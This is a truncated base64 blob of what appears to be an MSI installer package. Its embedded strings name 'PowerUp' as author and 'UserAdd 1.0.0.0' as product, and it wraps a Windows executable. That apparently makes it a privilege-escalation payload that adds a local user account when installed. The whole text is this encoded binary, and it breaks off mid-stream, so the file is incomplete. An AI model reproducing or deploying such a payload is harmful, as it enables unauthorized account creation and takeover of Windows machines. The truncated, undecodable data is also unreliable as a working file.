AAABQSJaT62LPAQMAAABAFwAAAAAAAAUAUwB1AG0AbQBhAHIAeQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAIBEAAAABkAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANgBAAAAAAAAQEj/P+RD7EHkRaxEMUgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAgEVAAAAAwAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAEAgAAAAAAABASMpBMEOxOztCJkY3QhxCNEZoRCZCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAACAQQAAAABAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACoAAAAwAAAAAAAAAEBIykEwQ7E/Ej8oRThCsUEoSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAIBEgAAAA0AAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKwAAABgAAAAAAAAAQEjKQflFzkaoQfhFKD8oRThCsUEoSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAgH///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAAAAKgAAAAAAAABASAtDMUE1RwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgACARMAAAAWAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFkAAAAIAAAAAAAAAEBIfz9kQS9CNkgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAIBBgAAAAwAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWgAAACYAAAAAAAAAC0MxQTVHfkG9RwxG9kUyRIpBN0NyRM1DL0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAgH/////DwAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXAAAAAFgBAAAAAABASIxE8ERyRGhEN0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgACAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4AAAAMAAAAAAAAAEBIDEb2RTJEikE3Q3JEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAIA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALwAAADwAAAAAAAAAQEgNQzVC5kVyRTxIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAgEOAAAAGAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAEgAAAAAAAABASA9C5EV4RShIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAACAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADEAAAAQAAAAAAAAAEBID0LkRXhFKDsyRLNEMULxRTZIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWAAIB/////xEAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMgAAAAQAAAAAAAAAQEhZRfJEaEU3RwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAgEUAAAA//////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABXAAAAWAAAAAAAAAALQzFBNUd+Qb1HYEXkRDNCJz/oRfhEWUWyQjVBMEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAACAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAOAEAAAAAAEBIUkT2ReRDrzs7QiZGN0IcQjRGaEQmQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAIABQAAAAgAAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAAAAJYAAAAAAAAAQEhSRPZF5EOvPxI/KEU4QrFBKEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABYAAgD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3AAAAMAAAAAAAAABASBVBeETmQoxE8UHsRaxEMUgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAACAQoAAAD//////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgAAAAEAAAAAAAAAEBIFkInQyRIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAIA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOQAAAA4AAAAAAAAAQEjeRGpF5EEoSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAgD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABWAAAAIAAAAAAAAABASBtCKkP2RTVHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAACAQcAAAALAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwAAAA8AAAAAAAAAEBIPzvyQzhEsUUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAIA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASwAAAKACAAAAAAAAQEg/P3dFbERqPrJEL0gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAgD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtAAAASAQAAAAAAABASD8/d0VsRGo75EUkSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAACAQkAAAAXAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAPIAAAAAAAAAUARABvAGMAdQBtAGUAbgB0AFMAdQBtAG0AYQByAHkASQBuAGYAbwByAG0AYQB0AGkAbwBuAAAAAAAAAAAAAAA4AAIA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWwAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+////BiEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///////////////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAADAAAABAAAAAUAAAAGAAAABwAAAP7/////////CgAAAAsAAAAMAAAADQAAAA4AAAAPAAAAEAAAABEAAAASAAAAEwAAABQAAAAVAAAAFgAAABcAAAAYAAAAGQAAABoAAAAbAAAAHAAAAB0AAAAeAAAAHwAAACAAAAAhAAAAIgAAACMAAAAkAAAAJQAAACYAAAAnAAAAKAAAACkAAAD+/////v////7////+////MwAAAP7////+/////v////7////+////OgAAADUAAAA2AAAA/v////7////+/////v///zsAAAA9AAAA/v///z4AAAA/AAAAQAAAAEEAAABCAAAAQwAAAEQAAABFAAAARgAAAEcAAABIAAAASQAAAEoAAAD+////TAAAAE0AAABOAAAATwAAAFAAAABRAAAAUgAAAFMAAABUAAAAVQAAAP7////+////WAAAAP7////+/////v///1wAAAD+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////7/AAAGAQIAAAAAAAAAAAAAAAAAAAAAAAEAAADghZ/y+U9oEKuRCAArJ7PZMAAAAKgBAAAOAAAAAQAAAHgAAAACAAAAkAEAAAMAAACAAQAABAAAAHABAAAFAAAAgAAAAAYAAAAoAQAABwAAAJQAAAAJAAAAqAAAAAwAAADYAAAADQAAAOQAAAAOAAAA8AAAAA8AAAD4AAAAEgAAAAgBAAATAAAAAAEAAAIAAADkBAAAHgAAAAoAAABJbnN0YWxsZXIAAAAeAAAACwAAAEludGVsOzEwMzMAAB4AAAAnAAAAe0EwNDlFMzFGLTc3MDEtNEM0QS1BQ0JDLUIyNjBFQjA4QkI0Q30AAEAAAAAALfR1QTjPAUAAAAAALfR1QTjPAQMAAADIAAAAAwAAAAIAAAADAAAAAgAAAB4AAAAXAAAATVNJIFdyYXBwZXIgKDQuMS41NC4wKQAAHgAAAEAAAABJbnN0YWxsZXIgd3JhcHBlZCBieSBNU0kgV3JhcHBlciAoNC4xLjU0LjApIGZyb20gd3d3LmV4ZW1zaS5jb20AHgAAAAgAAABQb3dlclVwAB4AAAAIAAAAVXNlckFkZAAeAAAAEAAAAFVzZXJBZGQgMS4wLjAuMABBOM8BAwAAAMgAAAADAAAAAgAAAB4AAAArAAAAV2luZG93cyBJbnN0YWxsZXIgWE1MIFRvb2xzZXQgKDMuOC4xMTI4LjApAAADAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYABgAGAAYABgAGAAYABgAGAAYACgAKACIAIgAiACkAKQApACoAKgAqACsAKwAvAC8ALwAvAC8ALwA1ADUANQA9AD0APQA9AD0ATQBNAE0ATQBNAE0ATQBNAFwAXABhAGEAYQBhAGEAYQBhAGEAbwBvAHIAcgByAHMAcwBzAHQAdAB3AHcAdwB3AHcAdwCCAIIAhgCGAIYAhgCGAIYAkACQAJAAkACQAJAAkAACAAUACwAMAA0ADgAPABAAEQASAAcACQAjACUAJwAjACUAJwAjACUAJwABAC0AJQAvADEANAA3ADoANQBJAEsABAAjAEAAQwBGAAsANAA3AE0ATwBRAFQAVgBdAF8AJwA3AF8AYQBkAGcAaQBrAAEALQAjACUAJwAjACUAJwALACUAQAB4AHoAfAB+AIAABwCCAAEABwBfAIYAiACKADcAawCRAJMAlQCZAJsACAAIABgAGAAYABgAGAAIABgAGAAIAAgACAAYABgACAAYABgACAAYABgACAAIABgACAAYAAgACAAYAAgAGAAIAAgACAAYABgAGAAYABgACAAIABgAGAAYAAgACAAIAAgAGAAIAAgACAAIABgAGAAIAAgACAAYABgACAAYABgACAAIABgACAAIABgAGAAYAAgACAAYABgACAAIAAgACAAIABgACAAYABgAGAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAgAEAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAA/P//fwAAAAAAAAAA/P//fwAAAAAAAAAA/P//fwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAgAAAAAAAAAAAAQAAgAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/P//fwAAAAAAAAAA/P//fwAAAAAAAAAAAAAAAAEAAIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////fwAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAACA/////wAAAAAAAAAA/////wAAAAAAAAAAAAAAAAAAAAD/fwCAAAAAAAAAAAD/fwCAAAAAAAAAAAD/fwCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/fwCAAAAAAAAAAAAAAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP9/AID/fwCAAAAAAAAAAAD//////38AgAAAAAAAAAAAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/fwCAAAAAAAAAAAD/fwCAAAAAAAAAAAAAAAAA/38AgP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAACAAAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANQAAADsAAAA1AAAAAAAAAAAAAAAAAAAANQAAAAAATQAAAAAAAABNAC8AAAAAAC8AAAAAAAAAYQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAABgAAAAYAAAAAAAAAAAAAAAAAAAAGAAAAAAAGAAAAAAAAAAYABgAAAAAABgAAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAAAAAAAAAAAAAAAAAAAAAAAABMAEwAfAB8AAAAAAAAAAAATAAAAAAAAABMAJQAAABMAJQAAABMAJQAAABMAKwAlABMAMgATAAAAEwATABMASwAAABMAQQBEAAAAHwBYAAAAEwATAB8AAAAAABMAEwAAAAAAEwATAGUAAABpAGsAEwArABMAJQAAABMAJQAAAEQAJQCCAAAAAAAfAH4AHwAfABMARABEABMAEwAAAIsAAABrADIAHwAfAEQAWAAAAAAAAAAAAB0AAAAAABYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAVACEAIAAeABwAGgAXABsAGQAAAAAAJAAmACgAJAAmACgAJAAmACgALAAuADkAMAAzADYAOAA8AEgASgBMAD8APgBCAEUARwBTAFkAWwBOAFAAUgBVAFcAXgBgAG4AbQBjAGIAZgBoAGoAbABwAHEAJAAmACgAJAAmACgAdgB1AIMAeQB7AH0AfwCBAIUAhACNAI4AjwCHAIkAjACYAJcAkgCUAJYAmgCcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJ0AngCfAKAAoQCiAKMApAAAAAAAAAAAAAAAAAAAAAAAIIOEg+iDeIXchTyPoI/ImQAAAAAAAAAAAAAAAAAAAACdAJ4AnwClAAAAAAAAAAAAIIOEg+iDFIUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnQCfAKAAoQCkAKYApwAAAAAAAAAAAAAAAAAAACCD6IN4hdyFyJmcmACZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAYABQACAAAAAAAEAAIABgACAAsAFQAFAAUAAQAsAAoAAQATAAIACwAGAAMAAgAIAAIACQACAAgAAgCqAKsArAAEgAAArQDNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAArgCvALEAswC2ADOAAYwBgAKMAYCvAKkAqQCoAKkAsAC1ALIAtAC3AAAAAAAAAAAAAAAAAAAAAAAAAAAAumLMyKwAuAC6ALgAugAAALkAuwC8AF3I0GLMyFJpY2jRYszIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBQC9AAAAvgAAAAKAAYAAAACACwEJAADmAAAAbgAAAAAAAJdEAAAAEAAAAAABAAAAABAAEAAAAAIAAAUAAAAAAAAAvQCqAAAAAAAAsAEAAAQAAJ/CAQACAEABAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAcD8BAJoAAADsNgEAjAAAAAgAAgAIAAIACAACAAoAGQANAAEADgABAAMAAQAeAAEAAQAqABUAAQAVAAEANgABACQAAQD1AAEADwABAAQACQCdAJ4AnwCgAKEAowCkAKYApwCuAK8AsQCzALYAwADBAMIAwwDEAMUAxgDHAMgAyQDKAAAAAAAAAAAAAAAAAAAAAAAAAMsAywDLAMsAzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIIOEg+iDeIXchaCPyJmcmACZ24Wjj6GPoo+kjxmAZIC8grCEQIYIhyiKiJNwl9SXeYWqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqdAJ4AnwClAMAAwQDCAMMAAAAAAAAAAAAAAAAAAAAAACCDhIPogxSFGYBkgLyCsIR3d3d3h3eHh4eHiIiBaqgAzQDOAAdwB3B3eHh4hxqlAKoIJSUlJwQndIiIiIhqqAcHBwdwcHAHcHd3d3d4GqYAAAAHAHBwAAcHcHd3d2qoAAGAAAAAgAAAAAAAAAAAqAd3B3d3d3AHcHeHd4d3aqgAAAAAAAAAAAAAAAAAcIqoAGoIhINIoASneEiIhHeKqAcgAAEAFQABABQABwAGAAwAQgAFAAkAFQCfAAUACAAMAG8ABQAPAAcAEwAHAAYABwAnAAEABAAEABwAAQAJABIAOwABAAsAAgAEAAIAPgABAAoABAAJAAwA0gABAAoACAAnAAEA6AABAAcAAgAcAAEA4wABAAwACwBTAAEAXgABAK0AAgEFAQgBCwECgAKAAoACgAKA/wD/AP8A/wD/AAABAwEGAQkBDAEBAQQBBwEKAQ0BqgCqAKoAqgCqAKqqqqoGAAQADAABAC4AAQAGAAIACQAFADoAAQAMAAIAVwABAIYAAQAQAAIApgABAAoAAwApAAEABwAVADkAAQAOAAIAlAABAAUAAgAuAAEAOgABAAcAAgA+AAEABQACAIEAAQAJAAIAawABAFEAAQASAAEAEQAFAAgAAgAfAAEACgAGACEAAQAEABQAcwABADkAAQAIAAIACAABAGMAAQAIAAIAJQABAAcAAwBBAAEACAAGAD8AAQB2AAEASgABAAQABQBOYW1lVGFibGVUeXBlQ29sdW1uX1ZhbGlkYXRpb25WYWx1ZU5Qcm9wZXJ0eUlkX1N1bW1hcnlJbmZvcm1hdGlvbkRlc2NyaXB0aW9uU2V0Q2F0ZWdvcnlLZXlDb2x1bW5NYXhWYWx1ZU51bGxhYmxlS2V5VGFibGVNaW5WYWx1ZUlkZW50aWZpZXJOYW1lIG9mIHRhYmxlTmFtZSBvZiBjb2x1bW5ZO05XaGV0aGVyIHRoZSBjb2x1bW4gaXMgbnVsbGFibGVZTWluaW11bSB2YWx1ZSBhbGxvd2VkTWF4aW11bSB2YWx1ZSBhbGxvd2VkRm9yIGZvcmVpZ24ga2V5LCBOYW1lIG9mIHRhYmxlIHRvIHdoaWNoIGRhdGEgbXVzdCBsaW5rQ29sdW1uIHRvIHdoaWNoIGZvcmVpZ24ga2V5IGNvbm5lY3RzVGV4dDtGb3JtYXR0ZWQ7VGVtcGxhdGU7Q29uZGl0aW9uO0d1aWQ7UGF0aDtWZXJzaW9uO0xhbmd1YWdlO0lkZW50aWZpZXI7QmluYXJ5O1VwcGVyQ2FzZTtMb3dlckNhc2U7RmlsZW5hbWU7UGF0aHM7QW55UGF0aDtXaWxkQ2FyZEZpbGVuYW1lO1JlZ1BhdGg7Q3VzdG9tU291cmNlO1Byb3BlcnR5O0NhYmluZXQ7U2hvcnRjdXQ7Rm9ybWF0dGVkU0RETFRleHQ7SW50ZWdlcjtEb3VibGVJbnRlZ2VyO1RpbWVEYXRlO0RlZmF1bHREaXJTdHJpbmcgY2F0ZWdvcnlUZXh0U2V0IG9mIHZhbHVlcyB0aGF0IGFyZSBwZXJtaXR0ZWREZXNjcmlwdGlvbiBvZiBjb2x1bW5BZG1pbkV4ZWN1dGVTZXF1ZW5jZUFjdGlvbk5hbWUgb2YgYWN0aW9uIHRvIGludm9rZSwgZWl0aGVyIGluIHRoZSBlbmdpbmUgb3IgdGhlIGhhbmRsZXIgRExMLkNvbmRpdGlvbk9wdGlvbmFsIGV4cHJlc3Npb24gd2hpY2ggc2tpcHMgdGhlIGFjdGlvbiBpZiBldmFsdWF0ZXMgdG8gZXhwRmFsc2UuSWYgdGhlIGV4cHJlc3Npb24gc3ludGF4IGlzIGludmFsaWQsIHRoZSBlbmdpbmUgd2lsbCB0ZXJtaW5hdGUsIHJldHVybmluZyBpZXNCYWRBY3Rpb25EYXRhLlNlcXVlbmNlTnVtYmVyIHRoYXQgZGV0ZXJtaW5lcyB0aGUgc29ydCBvcmRlciBpbiB3aGljaCB0aGUgYWN0aW9ucyBhcmUgdG8gYmUgZXhlY3V0ZWQuICBMZWF2ZSBibGFuayB0byBzdXBwcmVzcyBhY3Rpb24uQWRtaW5VSVNlcXVlbmNlQWR2dEV4ZWN1dGVTZXF1ZW5jZUJpbmFyeVVuaXF1ZSBrZXkgaWRlbnRpZnlpbmcgdGhlIGJpbmFyeSBkYXRhLkRhdGFUaGUgdW5mb3JtYXR0ZWQgYmluYXJ5IGRhdGEuQ29tcG9uZW50UHJpbWFyeSBrZXkgdXNlZCB0byBpZGVudGlmeSBhIHBhcnRpY3VsYXIgY29tcG9uZW50IHJlY29yZC5Db21wb25lbnRJZEd1aWRBIHN0cmluZyBHVUlEIHVuaXF1ZSB0byB0aGlzIGNvbXBvbmVudCwgdmVyc2lvbiwgYW5kIGxhbmd1YWdlLkRpcmVjdG9yeV9EaXJlY3RvcnlSZXF1aXJlZCBrZXkgb2YgYSBEaXJlY3RvcnkgdGFibGUgcmVjb3JkLiBUaGlzIGlzIGFjdHVhbGx5IGEgcHJvcGVydHkgbmFtZSB3aG9zZSB2YWx1ZSBjb250YWlucyB0aGUgYWN0dWFsIHBhdGgsIHNldCBlaXRoZXIgYnkgdGhlIEFwcFNlYXJjaCBhY3Rpb24gb3Igd2l0aCB0aGUgZGVmYXVsdCBzZXR0aW5nIG9idGFpbmVkIGZyb20gdGhlIERpcmVjdG9yeSB0YWJsZS5BdHRyaWJ1dGVzUmVtb3RlIGV4ZWN1dGlvbiBvcHRpb24sIG9uZSBvZiBpcnNFbnVtQSBjb25kaXRpb25hbCBzdGF0ZW1lbnQgdGhhdCB3aWxsIGRpc2FibGUgdGhpcyBjb21wb25lbnQgaWYgdGhlIHNwZWNpZmllZCBjb25kaXRpb24gZXZhbHVhdGVzIHRvIHRoZSAnVHJ1ZScgc3RhdGUuIElmIGEgY29tcG9uZW50IGlzIGRpc2FibGVkLCBpdCB3aWxsIG5vdCBiZSBpbnN0YWxsZWQsIHJlZ2FyZGxlc3Mgb2YgdGhlICdBY3Rpb24nIHN0YXRlIGFzc29jaWF0ZWQgd2l0aCB0aGUgY29tcG9uZW50LktleVBhdGhGaWxlO1JlZ2lzdHJ5O09EQkNEYXRhU291cmNlRWl0aGVyIHRoZSBwcmltYXJ5IGtleSBpbnRvIHRoZSBGaWxlIHRhYmxlLCBSZWdpc3RyeSB0YWJsZSwgb3IgT0RCQ0RhdGFTb3VyY2UgdGFibGUuIFRoaXMgZXh0cmFjdCBwYXRoIGlzIHN0b3JlZCB3aGVuIHRoZSBjb21wb25lbnQgaXMgaW5zdGFsbGVkLCBhbmQgaXMgdXNlZCB0byBkZXRlY3QgdGhlIHByZXNlbmNlIG9mIHRoZSBjb21wb25lbnQgYW5kIHRvIHJldHVybiB0aGUgcGF0aCB0byBpdC5DdXN0b21BY3Rpb25QcmltYXJ5IGtleSwgbmFtZSBvZiBhY3Rpb24sIG5vcm1hbGx5IGFwcGVhcnMgaW4gc2VxdWVuY2UgdGFibGUgdW5sZXNzIHByaXZhdGUgdXNlLlRoZSBudW1lcmljIGN1c3RvbSBhY3Rpb24gdHlwZSwgY29uc2lzdGluZyBvZiBzb3VyY2UgbG9jYXRpb24sIGNvZGUgdHlwZSwgZW50cnksIG9wdGlvbiBmbGFncy5Tb3VyY2VDdXN0b21Tb3VyY2VUaGUgdGFibGUgcmVmZXJlbmNlIG9mIHRoZSBzb3VyY2Ugb2YgdGhlIGNvZGUuVGFyZ2V0Rm9ybWF0dGVkRXhjZWN1dGlvbiBwYXJhbWV0ZXIsIGRlcGVuZHMgb24gdGhlIHR5cGUgb2YgY3VzdG9tIGFjdGlvbkV4dGVuZGVkVHlwZUEgbnVtZXJpYyBjdXN0b20gYWN0aW9uIHR5cGUgdGhhdCBleHRlbmRzIGNvZGUgd